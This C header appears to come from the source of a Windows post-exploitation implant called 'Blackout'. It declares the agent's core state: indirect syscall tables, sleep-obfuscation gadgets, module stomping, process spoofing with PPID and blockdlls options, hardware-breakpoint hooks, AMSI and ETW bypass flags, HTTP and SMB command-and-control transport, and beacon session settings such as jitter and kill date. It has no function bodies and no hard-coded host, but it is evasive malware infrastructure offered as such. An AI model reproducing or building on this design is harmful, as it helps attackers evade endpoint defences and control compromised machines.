#ifndef INSTANCE_COMMON_H
#define INSTANCE_COMMON_H

//
// system headers
//
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
//
// blackout headers
//
#include <native.h>
#include <macros.h>
#include <misc.h>
#include <utils.h>
#include <command.h>
#include <communication.h>

#define BLACKOUT_COMMAND_LENGTH 20
#define BLACKOUT_MAGIC_VALUE    0x6F626C76
//
// blackout instances
//
EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

typedef  NTSTATUS (*fLdrLoadDll)(PWSTR DllPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID *DllHandle);

enum {
    ThreadEnumAll,
    ThreadEnumTarget,
    ThreadEnumFirst
} THREAD_ENUM; 

typedef struct _SLEEP_OBF {
    UINT32 Technique;
    UINT16 InsGadget;
    PVOID  JmpGadget;
    PVOID  RetGadget;
    PVOID  NtContinueGadget;
} SLEEP_OBF, *PSLEEP_OBF;

typedef struct _BUFFER {
    PVOID  Base;
    UINT64 Length;
} BUFFER, *PBUFFER;

typedef struct _STOMP {
    PVOID Backup;
    USTR  ModName;
    PVOID ModBase;
} STOMP, *PSTOMP;

typedef struct _FORK {
    PSTR  Spawnto;
    DWORD Ppid;
    BOOL  Blockdlls;
    PWSTR Argue;            
} FORK, *PFORK;

typedef struct _HWBP {
    PVOID            VectorHandle;
    PVOID            DetourFunc[4];
    CRITICAL_SECTION CriticalSection;
    BYTE             Ret[1];
} HWBP, *PHWBP;

typedef struct _SYS_TBL {
    ULONG Ssn;
    ULONG SysHash;
    PVOID SysAddr;
    PVOID SysInsAddr;
} SYS_TBL, *PSYS_TBL;

typedef struct  _SYS_API {
    SYS_TBL NtAllocateVirtualMemory;
    SYS_TBL NtProtectVirtualMemory;
    SYS_TBL NtWriteVirtualMemory;
    SYS_TBL NtOpenProcess;
    SYS_TBL NtOpenThread;
    SYS_TBL NtOpenThreadToken;
    SYS_TBL NtOpenProcessToken;
    SYS_TBL NtClose;
    SYS_TBL NtQueryVirtualMemory;
    SYS_TBL NtFreeVirtualMemory;
    SYS_TBL NtCreateThreadEx;
    SYS_TBL NtTerminateThread;
    SYS_TBL NtTerminateProcess;
    SYS_TBL NtSuspendThread;
    SYS_TBL NtResumeThread;
    SYS_TBL NtCreateFile;
    SYS_TBL NtWriteFile;
    SYS_TBL NtCreateSection;
    SYS_TBL NtMapViewOfSection;
    SYS_TBL NtUnmapViewOfSection;
    SYS_TBL NtGetContextThread;
    SYS_TBL NtSetContextThread;
    SYS_TBL NtWaitForSingleObject;
    SYS_TBL NtQueueApcThread;
} SYS_API, *PSYS_API;

typedef struct _NTDLL_CONFIG {
    PDWORD      ArrayOfAddr;     
    PDWORD      ArrayOfNames;     
    PWORD       ArrayOfOrdinals;   
    ULONG       NumberOfNames;     
    ULONG_PTR   uModule;          
}NTDLL_CONF, * PNTDLL_CONF;

typedef struct _SYSC {
    SYS_API     SysTable;
    UINT32      wSystemCall;                  
    PVOID       qSyscallInsAdress;
    NTDLL_CONF  NtdllConf;
} SYSC, *PSYSC;

typedef struct _SECTION_MAP {
    PVOID Base;
    ULONG Size;
} SECTION_MAP, *PSECTION_MAP; 

typedef struct _OBJECT_CTX {
    union {
        ULONG_PTR          Base;
        PIMAGE_FILE_HEADER Header;
    };

    PIMAGE_SYMBOL         SymTbl;
    PVOID*                SymMap;
    PSECTION_MAP          SecMap;
    PIMAGE_SECTION_HEADER Sections;
} OBJECT_CTX, *POBJECT_CTX;

typedef struct _INSTANCE {

    PTEB Teb;
    struct {
        D_API( ReadProcessMemory );
        D_API( DeleteProcThreadAttributeList );
        D_API( RtlAddFunctionTable );
        D_API( NtFlushInstructionCache );
        D_API( UnmapViewOfFile );
        D_API( MapViewOfFile );
        D_API( CreateFileMappingA );
        D_API( ConvertFiberToThread );
        D_API( CreateFiber );
        D_API( ConvertThreadToFiber );
        D_API( SwitchToFiber );
        D_API( DeleteFiber );
        D_API( strcat );
        D_API( GetFileSize );
        D_API( FindClose );
        D_API( FindNextFileA );
        D_API( FindNextFileW );
        D_API( FindFirstFileW );
        D_API( FindFirstFileA );
        D_API( RtlDeleteTimer );
        D_API( RtlDeleteTimerQueue );
        D_API( vprintf );
        D_API( strncmp );
        D_API( RtlDeleteCriticalSection );
        D_API( RtlInitializeCriticalSection );
        D_API( VirtualFreeEx );
        D_API( CreatePipe );
        D_API( CreateNamedPipeA );
        D_API( CreateNamedPipeW );
        D_API( ConnectNamedPipe );
        D_API( CreateMailslotA );
        D_API( CreateMailslotW );
        D_API( CreateFileA );
        D_API( CreateFileW );
        D_API( ReadFile );
        D_API( FormatMessageA );
        D_API( CreateTimerQueueTimer );
        D_API( OpenProcess );
        D_API( OpenProcessToken );
        D_API( OpenThread );
        D_API( OpenThreadToken );
        D_API( CreateProcessA );
        D_API( CreateProcessW );
        D_API( CreateProcessAsUserA );
        D_API( CreateProcessAsUserW );
        D_API( CreateProcessWithLogonW );
        D_API( CreateProcessWithTokenW );
        D_API( InitializeProcThreadAttributeList );
        D_API( UpdateProcThreadAttribute );
        D_API( WaitForDebugEvent );
        D_API( WriteProcessMemory );
        D_API( DebugActiveProcessStop );
        D_API( ContinueDebugEvent );
        D_API( CloseHandle );
        D_API( GetLastError );
        D_API( FreeLibrary );
        D_API( LoadLibraryA );
        D_API( LoadLibraryExA );
        D_API( LocalAlloc );
        D_API( LocalFree );
        D_API( LocalReAlloc );
        D_API( VirtualFree );
        D_API( VirtualQuery );
        D_API( VirtualQueryEx );
        D_API( VirtualAlloc );
        D_API( VirtualAllocEx );
        D_API( VirtualProtect );
        D_API( VirtualProtectEx );
        D_API( WaitForSingleObject );
        D_API( WaitForSingleObjectEx );
        D_API( CreateThread );
        D_API( CreateRemoteThread );
        D_API( QueueUserAPC );
        D_API( GetProcAddress );
        D_API( GetModuleHandleA );
        D_API( GetTickCount );
        D_API( GetComputerNameExA );
        D_API( TerminateProcess );
        D_API( GetProductInfo );
        D_API( GetNativeSystemInfo );
        D_API( HeapWalk );
        D_API( GetCurrentDirectoryA );
        D_API( SetCurrentDirectoryA );
        D_API( DuplicateHandle );
        D_API( GetThreadId );
        D_API( ResumeThread );
        D_API( SuspendThread );
        D_API( TerminateThread );
        D_API( GetMappedFileNameA );
        D_API( SetFileInformationByHandle );
        D_API( LoadLibraryExW );
        D_API( RtlCompareMemory );
        D_API( _RtlCopyMemory );
        D_API( RtlExitUserProcess );
        D_API( RtlExitUserThread );
        D_API( RtlAllocateHeap );
        D_API( RtlCreateHeap );
        D_API( RtlFreeHeap );
        D_API( RtlReAllocateHeap );
        D_API( RtlCreateTimer );
        D_API( RtlRandomEx );
        D_API( RtlGetVersion );
        D_API( RtlIpv6StringToAddressA );
        D_API( NtAllocateVirtualMemory );
        D_API( NtProtectVirtualMemory );
        D_API( NtCreateThreadEx );
        D_API( LdrLoadDll );
        D_API( LdrUnloadDll );
        D_API( NtGetNextProcess );
        D_API( NtQuerySystemInformation );
        D_API( NtQueryInformationProcess );
        D_API( NtQueryVirtualMemory );
        D_API( NtQueryInformationToken );
        D_API( NtQueryInformationThread );
        D_API( NtQueryInformationFile );
        D_API( NtSetInformationVirtualMemory );
        D_API( RtlAddVectoredContinueHandler );
        D_API( RtlAddVectoredExceptionHandler );
        D_API( RtlRemoveVectoredContinueHandler );
        D_API( RtlRemoveVectoredExceptionHandler );
        D_API( RtlCreateTimerQueue );
        D_API( NtUnmapViewOfSection );
        D_API( NtMapViewOfSection );
        D_API( NtCreateSection );
        D_API( NtOpenProcess );
        D_API( NtWaitForSingleObject );
        D_API( NtSignalAndWaitForSingleObject );
        D_API( NtTestAlert );
        D_API( NtQueueApcThread );
        D_API( NtGetContextThread );
        D_API( NtSetContextThread );
        D_API( NtAlertResumeThread );
        D_API( NtCreateEvent );
        D_API( NtContinue );
        D_API( NtClose );
        D_API( NtTerminateProcess );
        D_API( NtCreateFile );
        D_API( NtCreateNamedPipeFile );
        D_API( NtWriteVirtualMemory );
        D_API( NtSuspendProcess );
        D_API( NtTerminateThread );
        D_API( NtResumeThread );
        D_API( NtSuspendThread );
        D_API( NtOpenProcessToken );
        D_API( NtOpenProcessTokenEx );
        D_API( NtOpenThreadToken );
        D_API( NtOpenThreadTokenEx );
        D_API( NtFreeVirtualMemory );
        D_API( RtlCaptureContext );
        D_API( GetUserNameA );
        D_API( SystemFunction032 );
        D_API( LookupAccountSidA );
        D_API( LookupPrivilegeValueA );
        D_API( AdjustTokenPrivileges );
        D_API( DuplicateToken );
        D_API( ImpersonateLoggedOnUser );
        D_API( SetEvent );
        D_API( SystemFunction040 );
        D_API( SystemFunction041 );
        D_API( WinHttpOpen );
        D_API( WinHttpConnect );
        D_API( WinHttpOpenRequest );
        D_API( WinHttpReceiveResponse );
        D_API( WinHttpSendRequest );
        D_API( WinHttpReadData );
        D_API( WinHttpSetOption );
        D_API( WinHttpCloseHandle );
        D_API( printf );
        D_API( TpReleaseCleanupGroupMembers );
        D_API( GetAdaptersInfo );
    } Win32;

    struct {
        BUFFER    Region;
        BUFFER    RxRegion;
        BUFFER    RwRegion;
        STOMP     Stomp;
        PVOID     StackBase;
        BOOL      AmsiBypass;
        BOOL      EtwBypass;
        PVOID     Heap;
        FORK      Fork;
        HWBP      Hwbp;
        SYSC      Syscall;
        SLEEP_OBF SleepObf;
        UINT32    bkApi;
    } Blackout;

    struct {
        PVOID Ntdll;
        PVOID Kernelbase;
        PVOID Kernel32;
        PVOID Winhttp;
        PVOID Advapi32;
        PVOID Msvcrt;
        PVOID User32;
        PVOID Iphlpapi;
        PVOID Cryptbase;
        PVOID Cryptsp;
    } Modules;

    struct {   
        struct {
            LPWSTR   UserAgent;
            LPWSTR   Host;
            DWORD    Port;
            PPACKAGE Package;
            BOOL     Secure;
        } Http;

        struct {
            PSTR PipeName;
        } Smb;
    } Transport;
    
    struct {
        DWORD  AgentId;
        DWORD  ProcessArch;
        BOOL   Elevated;
        BOOL   Connected;
        HANDLE ProcessHandle;
        HANDLE ThreadHandle;
        PWSTR  ProcessName;
        PWSTR  ProcessFullPath;
        PWSTR  ProcessCmdLine;
        BOOL   Protected;
        DWORD  ParentProcId;
        DWORD  ProcessId;
        DWORD  ThreadId;
        DWORD  SleepTime;
        DWORD  Jitter;
        UINT64 KillDate;
        UINT32 WorkingHours;
    } Session;

    struct {
        PSTR  UserName;
        PSTR  DomainName;
        PSTR  ComputerName;
        PSTR  NetBios;
        WORD  OsArch;
        DWORD OsMajorV;
        DWORD OsMinorv;
        WORD  OsBuildNumber;
        DWORD ProcessorType;
        DWORD ProductType;
        PSTR  IpAddress;
    } System;

    BLACKOUT_COMMAND Commands[ BLACKOUT_COMMAND_LENGTH ];
} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

#endif //INSTANCE_COMMON_H
